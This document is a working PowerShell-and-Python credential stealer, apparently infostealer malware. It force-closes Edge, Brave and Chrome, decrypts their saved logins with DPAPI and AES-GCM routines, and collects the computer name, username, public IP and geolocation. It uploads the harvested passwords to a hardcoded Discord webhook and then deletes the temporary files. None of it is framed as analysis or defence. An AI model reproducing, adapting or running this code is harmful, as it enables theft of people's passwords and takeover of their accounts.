$wh="https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

function Send-Discord {
    param([string]$m)
    try { curl.exe -X POST -H "Content-Type: application/json" -d "{`"content`":`"$m`"}" $wh 2>$null } catch {}
}

Send-Discord "🔧 FIXED - $env:COMPUTERNAME"

Get-Process | Where-Object {$_.ProcessName -match "msedge|brave|chrome"} | Stop-Process -Force -EA 0
Start-Sleep 7

cd $env:TEMP\py

@'
import os,json,base64,sqlite3,shutil,win32crypt,socket,platform,getpass,datetime,time
from Crypto.Cipher import AES

WH = "https://discord.com/api/webhooks/1467597897435582594/wbqYsXdKoKB124ig5QJCGBBb88kmkTUpEKGEq0A6oZ-81uZ0ecgtHM-D8Zq44U7uh_8W"

def send(msg):
    try:
        import requests
        requests.post(WH, json={"content": msg[:1900]}, timeout=5)
    except:
        pass

send("🐍 Starting")

try:
    import requests
    ip=requests.get("https://api.ipify.org",timeout=3).text
    geo=requests.get(f"http://ip-api.com/json/{ip}",timeout=3).json()
    location=f"{geo['city']}, {geo['regionName']}, {geo['country']}"
    isp=geo.get('isp','N/A')
except:
    ip="N/A"
    location="N/A"
    isp="N/A"

import locale
language=locale.getdefaultlocale()[0] if locale.getdefaultlocale()[0] else "N/A"

def decrypt_password(enc_password, key):
    if not enc_password or len(enc_password) < 3:
        return None
    
    prefix = enc_password[:3]
    
    # v10/v11 (Edge, Chrome standard)
    if prefix in [b'v10', b'v11']:
        try:
            nonce = enc_password[3:15]
            ciphertext = enc_password[15:-16]
            tag = enc_password[-16:]
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            password = cipher.decrypt_and_verify(ciphertext, tag)
            return password.decode('utf-8', errors='ignore')
        except:
            pass
    
    # v20 (Brave) - FIX COMPLET
    elif prefix == b'v20':
        try:
            nonce = enc_password[3:15]
            
            # TOUTES les données après le nonce
            encrypted_data = enc_password[15:]
            
            # Le tag est dans les 16 DERNIERS bytes
            tag = encrypted_data[-16:]
            # Le ciphertext est TOUT sauf les 16 derniers bytes
            ciphertext = encrypted_data[:-16]
            
            # Déchiffrer normalement
            cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
            password = cipher.decrypt_and_verify(ciphertext, tag)
            
            # NE PAS retirer de bytes supplémentaires !
            return password.decode('utf-8', errors='ignore')
            
        except Exception as e:
            # Fallback : essayer sans verify
            try:
                nonce = enc_password[3:15]
                encrypted_data = enc_password[15:]
                
                cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
                # Décrypter tout
                password = cipher.decrypt(encrypted_data)
                
                # Retirer SEULEMENT les null bytes à la fin
                password = password.rstrip(b'\x00')
                
                # Vérifier si ça ressemble à du texte valide
                decoded = password.decode('utf-8', errors='ignore')
                
                # Si trop de caractères bizarres, probablement raté
                if len([c for c in decoded if ord(c) < 32 and c not in '\n\r\t']) > len(decoded) * 0.3:
                    return None
                
                return decoded
            except:
                pass
    
    # DPAPI (ancien format)
    try:
        password = win32crypt.CryptUnprotectData(enc_password, None, None, None, 0)[1]
        return password.decode('utf-8', errors='ignore')
    except:
        pass
    
    return None

def decrypt_browser(db_path, state_path, browser_name):
    results = []
    
    send(f"🔍 {browser_name}...")
    
    if not os.path.exists(db_path) or not os.path.exists(state_path):
        return results
    
    try:
        with open(state_path, 'r', encoding='utf-8') as f:
            key = win32crypt.CryptUnprotectData(base64.b64decode(json.load(f)['os_crypt']['encrypted_key'])[5:], None, None, None, 0)[1]
        
        temp_db = f"t_{browser_name}.db"
        if os.path.exists(temp_db):
            os.remove(temp_db)
        
        shutil.copy2(db_path, temp_db)
        time.sleep(1)
        
        conn = sqlite3.connect(temp_db, timeout=120)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ''")
        
        ok = 0
        fail = 0
        
        for url, user, enc_pwd in cursor.fetchall():
            pwd = decrypt_password(enc_pwd, key)
            if pwd and len(pwd) > 0:
                results.append(f"[{browser_name}] {url}\nUsername: {user}\nPassword: {pwd}\n")
                ok += 1
            else:
                fail += 1
        
        conn.close()
        os.remove(temp_db)
        
        send(f"✅ {browser_name}: {ok} OK, {fail} failed")
        
    except Exception as e:
        send(f"❌ {browser_name}: {str(e)}")
    
    return results

all_results = []

# Edge
e = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data")
if os.path.exists(e + r"\Default\Login Data"):
    all_results += decrypt_browser(e + r"\Default\Login Data", e + r"\Local State", "EDGE")

# Brave
b = os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data")
if os.path.exists(b + r"\Default\Login Data"):
    all_results += decrypt_browser(b + r"\Default\Login Data", b + r"\Local State", "BRAVE")

# Chrome
c = os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data")
if os.path.exists(c + r"\Default\Login Data"):
    all_results += decrypt_browser(c + r"\Default\Login Data", c + r"\Local State", "CHROME")

info = f"""{'='*60}
SYSTEM INFORMATION
{'='*60}
Date/Time: {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
Computer: {platform.node()}
Username: {getpass.getuser()}
OS: {platform.system()} {platform.release()}
Machine: {platform.machine()}
Processor: {platform.processor()}
Language: {language}
IP: {ip}
Location: {location}
ISP: {isp}
{'='*60}
TOTAL: {len(all_results)} passwords
{'='*60}

"""

with open("passwords.txt", "w", encoding="utf-8") as f:
    f.write(info + "\n".join(all_results) if all_results else info + "No passwords.\n")

send(f"📤 Uploading {len(all_results)} passwords...")
print("OK")
'@ | Out-File "fix.py" -Encoding UTF8

.\python.exe fix.py 2>&1 | Out-Null
curl.exe -F "file=@passwords.txt" $wh 2>$null
Send-Discord "✅ DONE"
Remove-Item passwords.txt,fix.py -Force -EA 0
